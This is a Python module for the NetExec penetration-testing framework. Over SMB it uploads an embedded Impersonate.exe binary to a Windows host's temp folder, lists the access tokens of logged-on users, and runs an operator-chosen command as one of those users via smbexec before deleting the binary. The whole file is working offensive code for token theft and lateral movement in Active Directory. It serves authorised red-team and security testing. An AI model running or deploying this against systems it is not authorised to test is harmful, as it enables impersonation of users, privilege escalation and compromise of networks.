# Impersonate module for nxc
# Author of the module : https://twitter.com/Defte_
# Impersonate: https://github.com/sensepost/Impersonate
# Token manipulation blog post https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/

from base64 import b64decode
from os import path
import sys

from nxc.paths import DATA_PATH


class NXCModule:
    name = "impersonate"
    description = "List and impersonate tokens to run command as locally logged on users"
    supported_protocols = ["smb"]
    opsec_safe = False  
    multiple_hosts = True

    def options(self, context, module_options):
        """
        TOKEN     // Token id to usurp
        EXEC      // Command to exec
        IMP_EXE   // Path to the Impersonate binary on your local computer
        """
        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.impersonate = "Impersonate.exe"
        self.useembeded = True
        self.token = self.cmd = ""
        with open(path.join(DATA_PATH, ("impersonate_module/impersonate.bs64"))) as impersonate_file:
            self.impersonate_embedded = b64decode(impersonate_file.read())
        if "EXEC" in module_options:
            self.cmd = module_options["EXEC"]

        if "TOKEN" in module_options:
            self.token = module_options["TOKEN"]

        if "IMP_EXE" in module_options:
            self.imp_exe = module_options["IMP_EXE"]
            self.useembeded = False

    def list_available_primary_tokens(self, _, connection):
        command = f"{self.tmp_dir}Impersonate.exe list"
        return connection.execute(command, True)

    def on_admin_login(self, context, connection):
        if self.useembeded:
            file_to_upload = "/tmp/Impersonate.exe"

            try:
                with open(file_to_upload, "wb") as impersonate:
                    impersonate.write(self.impersonate_embedded)
            except FileNotFoundError:
                context.log.fail(f"Impersonate file specified '{file_to_upload}' does not exist!")
                sys.exit(1)
        else:
            if path.isfile(self.imp_exe):
                file_to_upload = self.imp_exe
            else:
                context.log.error(f"Cannot open {self.imp_exe}")
                sys.exit(1)

        context.log.display(f"Uploading {self.impersonate}")
        with open(file_to_upload, "rb") as impersonate:
            try:
                connection.conn.putFile(self.share, f"{self.tmp_share}{self.impersonate}", impersonate.read)
                context.log.success("Impersonate binary successfully uploaded")
            except Exception as e:
                context.log.fail(f"Error writing file to share {self.tmp_share}: {e}")
                return

        try:
            if self.cmd == "" or self.token == "":
                context.log.display("Listing available primary tokens")
                p = self.list_available_primary_tokens(context, connection)
                for line in p.splitlines():
                    token, token_integrity, token_owner = line.split(" ", 2)
                    context.log.highlight(f"Primary token ID: {token:<2} {token_integrity:<6} {token_owner}")
            else:
                impersonated_user = ""
                p = self.list_available_primary_tokens(context, connection)
                for line in p.splitlines():
                    token_id, token_integrity, token_owner = line.split(" ", 2)
                    if token_id == self.token:
                        impersonated_user = token_owner.strip()
                        break

                if impersonated_user:
                    context.log.display(f"Executing {self.cmd} as {impersonated_user}")
                    command = f'{self.tmp_dir}Impersonate.exe exec {self.token} "{self.cmd}"'
                    for line in connection.execute(command, True, methods=["smbexec"]).splitlines():
                        context.log.highlight(line)
                else:
                    context.log.fail("Invalid token ID submitted")

        except Exception as e:
            context.log.fail(f"Error runing command: {e}")
        finally:
            try:
                connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.impersonate}")
                context.log.success("Impersonate binary successfully deleted")
            except Exception as e:
                context.log.fail(f"Error deleting Impersonate.exe on {self.share}: {e}")
